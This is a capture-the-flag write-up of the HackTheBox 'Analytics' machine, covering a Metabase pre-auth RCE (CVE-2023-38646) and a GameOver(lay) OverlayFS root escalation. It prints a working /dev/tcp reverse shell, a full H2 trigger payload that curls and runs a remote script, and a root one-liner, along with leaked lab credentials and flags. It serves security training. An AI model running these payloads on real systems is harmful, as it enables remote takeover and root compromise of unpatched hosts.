# Analytics: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Analytics |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.37.196 |
| **Tools Used** | Nmap, curl, Firefox, exploit.py (CVE-2023-38646), Python HTTP Server, nc, SSH, printenv, unshare, setcap |
| **Techniques** | Virtual Host Discovery, Metabase Version Fingerprinting, Pre-Auth RCE via Setup Token Abuse (CVE-2023-38646), Docker Container Enumeration, Environment Variable Credential Leak, SSH Lateral Movement, Kernel OverlayFS Privilege Escalation (GameOver(lay): CVE-2023-2640 / CVE-2023-32629) |
| **CVEs** | CVE-2023-38646 (Metabase Pre-Auth RCE), CVE-2023-2640 + CVE-2023-32629 (GameOver(lay) OverlayFS) |
| **Date** | July 2026 |

---

## Attack Chain Summary

```
Nmap → Port 80 nginx → redirect to analytical.htb →
/etc/hosts → Login page redirects to data.analytical.htb →
/etc/hosts update → Metabase login page →
curl version fingerprint → v0.46.6 → CVE-2023-38646 →
/api/session/properties → setup-token extracted →
exploit.py OR manual POST to /api/setup/validate →
Reverse shell as metabase inside Docker container →
printenv → META_USER=metalytics / META_PASS=An4lytics_ds20223# →
SSH as metalytics → User flag →
uname -a → kernel 6.2.0-25-generic → Ubuntu 22.04 Jammy →
GameOver(lay) one-liner → root → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and services on the target.

```
kali@kali:~$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.37.196 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
kali@kali:~$ nmap -p$ports -sC -sV 10.129.37.196

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.37.196
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Output Analysis**

| Port | Service | Notes |
| --- | --- | --- |
| 22 | OpenSSH 8.9p1 Ubuntu | SSH: entry point once credentials obtained |
| 80 | nginx 1.18.0 | Redirects to `analytical.htb`: virtual host enumeration needed |

Two ports. The nmap title field shows the server is redirecting to `http://analytical.htb/`: this hostname must be added to `/etc/hosts` before browsing. No credentials for SSH yet.

---

## Step 2: Web Enumeration and Virtual Host Discovery

**Goal:** Identify all web applications hosted on the target, including subdomains.

Added the primary hostname:

```
kali@kali:~$ echo "10.129.37.196 analytical.htb" | sudo tee -a /etc/hosts
```

Browsed to `http://analytical.htb`: a static "Research Information On Demand" landing page. Navigating to the **Login** button in the top navigation bar triggered a redirect to `http://data.analytical.htb`: a second virtual hostname not yet in `/etc/hosts`.

Added the subdomain:

```
kali@kali:~$ echo "10.129.37.196 data.analytical.htb" | sudo tee -a /etc/hosts
```

Browsed to `http://data.analytical.htb`: revealed a **Metabase** login page. Metabase is an open-source business intelligence and data analytics platform that allows users to create dashboards, run queries, and visualise data from connected databases. It is commonly deployed internally and often left exposed with default or weak configurations.

No credentials are available yet. The next step is to fingerprint the Metabase version to identify known vulnerabilities.

---

## Step 3: Metabase Version Fingerprinting

**Goal:** Identify the exact Metabase version to determine if it is vulnerable.

Metabase exposes its version information in the JavaScript embedded in its login page. Extracted it with curl:

```
kali@kali:~$ curl -s http://data.analytical.htb/ | grep version

{"date":"2023-06-29","tag":"v0.46.6","branch":"release-{"":{"Metabase":
{"msgid":"Metabase","msgstr":["Metabase"]}}}}</script>
```

Metabase version confirmed: **v0.46.6** (released 2023-06-29).

This version is vulnerable to **CVE-2023-38646**: a critical Pre-Authentication Remote Code Execution vulnerability. No login credentials are needed to exploit it.

---

## Step 4: Exploitation: CVE-2023-38646 (Metabase Pre-Auth RCE)

**Vulnerability Background:**

CVE-2023-38646 is a Pre-Authentication Remote Code Execution vulnerability affecting Metabase Open Source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1. The root cause is that Metabase's initial setup process generates a `setup-token` stored in the application settings. This token is intended for one-time use during initial configuration, but it is never invalidated after setup completes. The token remains permanently accessible at the `/api/session/properties` endpoint without authentication.

An attacker can retrieve this token, then craft a malicious `POST` request to the `/api/setup/validate` endpoint. This endpoint processes a database connection string, and by injecting a payload into the `db` parameter using the H2 database's `CREATE TRIGGER` syntax combined with `javascript\njava.lang.Runtime.getRuntime().exec()`, arbitrary OS commands can be executed as the user running the Metabase process. No authentication is required at any stage.

Two exploitation paths are documented below.

---

### Foothold Method 1: Python Exploit Script (exploit.py)

This is the fastest path: a single Python script automates setup-token retrieval, payload delivery, and reverse shell callback.

Created the reverse shell script on the attacker machine:

```
kali@kali:~$ echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.16.36/4444 0>&1' > rev.sh
```

Started a Python HTTP server to serve the reverse shell script: the exploit will instruct the Metabase server to fetch and execute it:

```
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Started a netcat listener to catch the reverse shell callback:

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

Ran the exploit script in a separate terminal:

```
kali@kali:~$ python3 exploit.py \
  -l 10.10.16.36 \
  -p 4444 \
  -P 8000 \
  -u http://data.analytical.htb

[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]
[*] Retrieving setup token
[+] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Testing if metabase is vulnerable
[+] Starting http server on port 8000
[+] Metabase version seems exploitable
[+] Exploiting the server

metabase_shell > whoami
metabase

metabase_shell > id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
```

The exploit automatically:

1. Fetched the `setup-token` from `/api/session/properties`
2. Constructed and sent the malicious `POST` to `/api/setup/validate`
3. Caused the Metabase server to pull `rev.sh` from the attacker's HTTP server and execute it
4. Delivered a reverse shell as `metabase`

---

### Foothold Method 2: Manual Exploitation via curl / Burp Suite

This method demonstrates the full exploit manually: useful for understanding what the script does and for environments where automated tools are not available.

**Step 1: Retrieve the setup-token:**

```
kali@kali:~$ curl -s http://data.analytical.htb/api/session/properties | python3 -m json.tool | grep setup-token

"setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
```

The setup-token is visible to any unauthenticated request.

**Step 2: Prepare the reverse shell payload:**

```
kali@kali:~$ echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.16.36/4444 0>&1' > rev.sh
kali@kali:~$ python3 -m http.server 8000
```

Start listener:

```
kali@kali:~$ nc -lvnp 4444
```

**Step 3: Send the malicious POST request:**

The payload abuses the H2 database engine's ability to execute JavaScript via `CREATE TRIGGER` syntax, calling `java.lang.Runtime.getRuntime().exec()` to fetch and execute the reverse shell:

```
kali@kali:~$ curl -s -X POST http://data.analytical.htb/api/setup/validate \
  -H "Content-Type: application/json" \
  -d '{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
      "is_on_demand": false,
      "is_full_sync": false,
      "is_sample": false,
      "cache_ttl": null,
      "refingerprint": false,
      "auto_run_queries": true,
      "schedules": {},
      "details": {
        "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('\''bash -c {curl,10.10.16.36:8000/rev.sh}|bash'\'')\n$$--=x",
        "advanced-options": false,
        "ssl": true
      },
      "name": "an-sec-research-team",
      "engine": "h2"
    }
  }'
```

**What happens when this request is sent:**

1. Metabase receives the `POST` to `/api/setup/validate`: this endpoint is accessible without authentication
2. The `token` field is validated against the stored `setup-token`: it matches
3. Metabase attempts to test the database connection using the H2 engine
4. The `db` parameter contains a malicious connection string with a `CREATE TRIGGER` payload
5. H2 executes the trigger as JavaScript, calling `Runtime.getRuntime().exec()`
6. The exec call uses brace expansion (`{curl,10.10.16.36:8000/rev.sh}`) to curl the reverse shell script from the attacker's HTTP server and pipe it to bash
7. The reverse shell connects back to the listener

Reverse shell received on the listener:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.37.196] 36408
/ $ id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
/ $
```

---

## Step 5: Docker Container Identification

**Goal:** Confirm the current execution environment and identify the container boundary.

```
/ $ hostname
d47c12286ce1

/ $ ls -la /
total 88
drwxr-xr-x    1 root     root          4096 Jul 11 17:41 .
drwxr-xr-x    1 root     root          4096 Jul 11 17:41 ..
-rwxr-xr-x    1 root     root             0 Jul 11 17:41 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 29  2023 app
drwxr-xr-x    1 metabase metabase      4096 Aug  3  2023 metabase.db
...
```

Two indicators confirm a Docker container:

- The **hostname** is a random hex string (`d47c12286ce1`): characteristic of Docker-assigned container IDs
- A **`.dockerenv`** file exists at `/`: Docker places this file in every container's root directory as a marker

This means the current shell is running inside a container, not on the host OS. The user flag and root flag are on the underlying host. Lateral movement out of the container is required.

---

## Step 6: Environment Variable Credential Leak

**Goal:** Extract credentials from the container's environment variables to gain access to the host.

Docker containers frequently receive sensitive configuration through environment variables: database passwords, API keys, service credentials. These are set by the orchestrator (Docker Compose, Kubernetes, etc.) and are visible to any process running inside the container.

```
/ $ printenv

SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=d47c12286ce1
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=2
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/bin/printenv
```

**Credentials extracted from environment:**

| Variable | Value |
| --- | --- |
| `META_USER` | `metalytics` |
| `META_PASS` | `An4lytics_ds20223#` |

These are not Metabase application credentials: the variable names (`META_USER`, `META_PASS`) suggest they are host-level credentials injected into the container for application configuration. Testing them against SSH on the underlying host is the logical next step.

---

## Step 7: SSH as metalytics: User Flag

**Goal:** Use the environment variable credentials to SSH into the host and capture the user flag.

```
kali@kali:~$ ssh metalytics@analytical.htb
metalytics@analytical.htb's password: An4lytics_ds20223#

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

Last login: Sat Aug  5 00:00:29 2023 from 10.10.14.41
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
```

Successfully authenticated on the host OS as `metalytics`. Captured user flag:

```
metalytics@analytics:~$ cat user.txt
4791e4719a7491ff617b13d35190cc17
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `4791e4719a7491ff617b13d35190cc17` |

---

## Step 8: Privilege Enumeration

**Goal:** Identify the kernel version and OS release to determine privilege escalation vectors.

```
metalytics@analytics:~$ uname -a
Linux analytical 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC
Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

metalytics@analytics:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

**Key findings:**

| Detail | Value |
| --- | --- |
| Kernel | `6.2.0-25-generic` |
| OS | Ubuntu 22.04.3 LTS (Jammy Jellyfish) |
| Architecture | x86_64 |

Kernel `6.2.0-25` on Ubuntu 22.04 Jammy is vulnerable to **GameOver(lay)**: a pair of OverlayFS local privilege escalation vulnerabilities tracked as CVE-2023-2640 and CVE-2023-32629. These were patched in kernel 6.2.0-26: version 25 is one patch behind and fully exploitable.

---

## Step 9: Privilege Escalation: GameOver(lay) CVE-2023-2640 / CVE-2023-32629

**Goal:** Exploit the OverlayFS vulnerability to escalate from `metalytics` to `root`.

**Vulnerability Background: GameOver(lay):**

GameOver(lay) is the name given to two related vulnerabilities in the Linux kernel's OverlayFS implementation, discovered and disclosed in July 2023 by Synacktiv:

**CVE-2023-2640**: An unprivileged user can set file capabilities on a file inside an OverlayFS mount. Normally, setting capabilities (like `cap_setuid`) requires root. OverlayFS incorrectly allows this operation for unprivileged users when certain mount options are in play.

**CVE-2023-32629**: A use-after-free vulnerability in OverlayFS that allows privilege escalation through a race condition in the `ovl_copy_up_meta_inode_data` function.

Together, they enable a completely unprivileged local user to gain root by abusing OverlayFS mount behaviour: specifically by creating a user namespace with `unshare`, setting `cap_setuid+eip` on a copy of Python 3, then mounting the manipulated directory via OverlayFS to bypass `nosuid` restrictions and execute Python as root.

**The exploit: one-liner breakdown:**

```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; \
setcap cap_setuid+eip l/python3; \
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && \
touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

**Step-by-step breakdown of what each part does:**

| Component | Purpose |
| --- | --- |
| `unshare -rm sh -c "..."` | Creates a new user namespace (`-r` maps current user to root inside it) and mount namespace (`-m`): allowing mount operations without being root on the host |
| `mkdir l u w m` | Creates four directories: `l` (lowerdir), `u` (upperdir), `w` (workdir), `m` (merged mount point): the four directories required for an OverlayFS mount |
| `cp /u*/b*/p*3 l/` | Glob expansion: copies `/usr/bin/python3` into the `l/` (lower) directory using wildcards to avoid shell restrictions |
| `setcap cap_setuid+eip l/python3` | Sets the `cap_setuid` capability on the copied python3 binary inside the user namespace: this is normally root-only but is permitted here due to CVE-2023-2640 |
| `mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m` | Mounts an OverlayFS union filesystem: the `l/` lower layer (containing our capped python3) merged with empty `u/` upper and `w/` work layers, presenting as directory `m/` |
| `touch m/*` | Triggers OverlayFS copy-up: when a file in the lower layer is touched (modified), OverlayFS copies it up to the upper layer, preserving the extended attributes including the `cap_setuid` capability set in the lower layer. This is where CVE-2023-32629 is abused: the capability survives into the upper layer outside the user namespace |
| `u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` | Executes the python3 binary from the upper layer (which now has `cap_setuid` intact on the real filesystem): calls `os.setuid(0)` to become root, then spawns `/bin/bash` |

Ran the exploit:

```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; \
setcap cap_setuid+eip l/python3; \
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && \
touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

Root shell obtained. `uid=0(root)` confirms full privilege escalation.

---

## Step 10: Root Flag

**Goal:** Capture the root flag.

```
root@analytics:~# cat /root/root.txt
965eff70e477cf34833ce4e750831c14
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| Root Flag | `965eff70e477cf34833ce4e750831c14` |

---

## Lessons Learned

**1. Virtual host and subdomain enumeration is mandatory, not optional.**
The attack surface here was entirely behind a subdomain (`data.analytical.htb`) that was not directly accessible from the nmap output. The login redirect revealed it, but in real assessments, active subdomain brute-forcing with tools like `ffuf` or `gobuster vhost` would be needed. Never assume the primary hostname is the only one.

**2. CVE-2023-38646: setup-tokens that never expire are a critical design flaw.**
Metabase's setup-token is a one-time use token by intent, but it is never invalidated. Any unauthenticated user can read it from `/api/session/properties` indefinitely. Combined with an RCE-capable endpoint that accepts it without authentication, the result is a complete pre-auth compromise. Keeping software updated is the only mitigation: v0.46.6.1 patches this.

**3. Fingerprint service versions before attempting exploitation.**
`curl | grep version` against the Metabase login page returned the exact version (`v0.46.6`) in under a second. Version fingerprinting before attempting exploits is faster and more precise than scanning CVE databases blindly. Every web application exposes version metadata somewhere: comments, headers, JSON responses, or JavaScript bundles.

**4. Docker containers routinely receive host credentials via environment variables.**
This is a standard Docker deployment pattern: credentials are injected via `-e` flags or `environment:` blocks in Docker Compose rather than hardcoded in application code. Any shell inside a Docker container should immediately run `printenv` as a first step. In this case, `META_USER` and `META_PASS` were the host SSH credentials, handed directly to the attacker.

**5. Kernel version is always the first thing to check for LPE on Linux.**
`uname -a` takes one second. Kernel `6.2.0-25` on Ubuntu 22.04 Jammy was one minor version behind the patch for GameOver(lay). The vulnerability was publicly disclosed in July 2023 with a working one-liner PoC. On any Linux foothold, checking the kernel against known LPE CVEs (GameOver(lay), DirtyPipe, DirtyCow, Netfilter, etc.) is a mandatory enumeration step before diving into SUID or sudo checks.

**6. GameOver(lay) is a one-liner, but understanding it matters.**
The OverlayFS exploit works by chaining a user namespace (`unshare -rm`) with capability injection (`setcap`) and OverlayFS copy-up semantics to plant a `cap_setuid` binary on the real filesystem outside the namespace. The capability survives the copy-up because the kernel fails to strip it during the transition. The practical takeaway: on any Ubuntu 22.04 system with kernel < 6.2.0-26 or < 5.15.0-78, this one-liner gets root instantly.

---

## Full Attack Chain Reference

1. Ran `nmap -p- --min-rate=1000` then targeted scan: identified SSH (22) and nginx (80)
2. Browsed `http://10.129.37.196`: page redirected to `analytical.htb`, added to `/etc/hosts`
3. Browsed `http://analytical.htb`: Login button redirected to `data.analytical.htb`
4. Added `data.analytical.htb` to `/etc/hosts`
5. Browsed `http://data.analytical.htb`: Metabase login page identified
6. Ran `curl http://data.analytical.htb/ | grep version`: confirmed Metabase v0.46.6
7. Researched v0.46.6: identified CVE-2023-38646 (Pre-Auth RCE via setup-token)
8. Retrieved setup-token from `/api/session/properties`: `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`
9. Created `rev.sh` reverse shell payload pointing to `10.10.16.36:4444`
10. Started `python3 -m http.server 8000` to serve `rev.sh`
11. Started `nc -lvnp 4444` listener
12. **Method 1:** Ran `exploit.py -l 10.10.16.36 -p 4444 -P 8000 -u http://data.analytical.htb`
13. **Method 2:** Sent malicious `POST` to `/api/setup/validate` with H2 `CREATE TRIGGER` payload via curl
14. Reverse shell received as `metabase` inside Docker container
15. Confirmed Docker: `.dockerenv` at `/`, hex hostname `d47c12286ce1`
16. Ran `printenv`: found `META_USER=metalytics` and `META_PASS=An4lytics_ds20223#`
17. SSH'd to `metalytics@analytical.htb` using discovered credentials: host access confirmed
18. Captured user flag from `/home/metalytics/user.txt`
19. Ran `uname -a`: kernel `6.2.0-25-generic` on Ubuntu 22.04 Jammy identified
20. Confirmed kernel vulnerable to GameOver(lay) (CVE-2023-2640 / CVE-2023-32629)
21. Ran the OverlayFS one-liner exploit: root shell obtained
22. Captured root flag from `/root/root.txt`

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- --min-rate=1000 -T4 10.129.37.196` | Fast full port scan |
| `echo "10.129.37.196 analytical.htb data.analytical.htb" \| sudo tee -a /etc/hosts` | Add virtual hostnames |
| `curl -s http://data.analytical.htb/ \| grep version` | Fingerprint Metabase version |
| `curl -s http://data.analytical.htb/api/session/properties \| python3 -m json.tool \| grep setup-token` | Extract setup-token without authentication |
| `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.16.36/4444 0>&1' > rev.sh` | Create reverse shell script |
| `python3 -m http.server 8000` | Serve reverse shell payload |
| `nc -lvnp 4444` | Start listener for reverse shell |
| `python3 exploit.py -l 10.10.16.36 -p 4444 -P 8000 -u http://data.analytical.htb` | Automated CVE-2023-38646 exploitation |
| `curl -X POST http://data.analytical.htb/api/setup/validate -H "Content-Type: application/json" -d '{...}'` | Manual exploit via crafted POST request |
| `hostname` | Confirm Docker container (hex hostname) |
| `ls -la /` | Check for `.dockerenv` marker |
| `printenv` | Dump all environment variables: look for credentials |
| `ssh metalytics@analytical.htb` | SSH to host using environment variable credentials |
| `uname -a` | Check kernel version for LPE candidates |
| `lsb_release -a` | Confirm Ubuntu release codename |
| `unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` | GameOver(lay) one-liner: root via OverlayFS |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
| --- | --- | --- |
| Exploit Public-Facing Application | T1190 | CVE-2023-38646 Pre-Auth RCE against Metabase v0.46.6 |
| Command and Scripting Interpreter | T1059.004 | Bash reverse shell delivered via Java Runtime exec() through H2 trigger |
| Virtualization / Sandbox Evasion | T1497 | Identified Docker container boundary via `.dockerenv` and hostname |
| Unsecured Credentials: Credentials in Environment | T1552.007 | `META_USER` and `META_PASS` extracted from Docker container env vars |
| Valid Accounts | T1078.003 | SSH login to host using credentials leaked from container environment |
| Exploitation for Privilege Escalation | T1068 | GameOver(lay) CVE-2023-2640/CVE-2023-32629 OverlayFS LPE → root |
